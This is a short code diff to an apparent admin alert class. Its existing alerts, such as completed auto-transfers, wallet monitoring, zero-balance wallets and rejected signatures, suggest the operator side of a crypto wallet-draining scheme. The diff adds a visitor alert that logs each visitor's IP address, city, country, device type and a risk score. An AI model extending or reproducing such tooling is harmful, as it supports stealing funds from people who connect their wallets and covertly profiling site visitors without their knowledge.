@@ -46,7 +46,8 @@ class AdminAlertSystem {
       'AUTO_TRANSFER_COMPLETED': 'HIGH',
       'WALLET_MONITORING_STARTED': 'MEDIUM',
       'ZERO_BALANCE_WALLET': 'LOW',
-      'SIGNATURE_REJECTED': 'LOW'
+      'SIGNATURE_REJECTED': 'LOW',
+      'SITE_VISITOR': 'LOW'
     };
     return priorities[type] || 'MEDIUM';
   }
@@ -82,6 +83,9 @@ class AdminAlertSystem {
       
       case 'ZERO_BALANCE_WALLET':
         return `🚫 EMPTY WALLET: ${data.userAddress} connected with zero balance`;
+      
+      case 'SITE_VISITOR':
+        return `👁️ NEW VISITOR: ${data.ip} from ${data.location?.city}, ${data.location?.country} | ${data.device.type} | Risk: ${data.riskLevel}`;
       
       default:
         return `📊 ALERT: ${type} - ${JSON.stringify(data)}`;
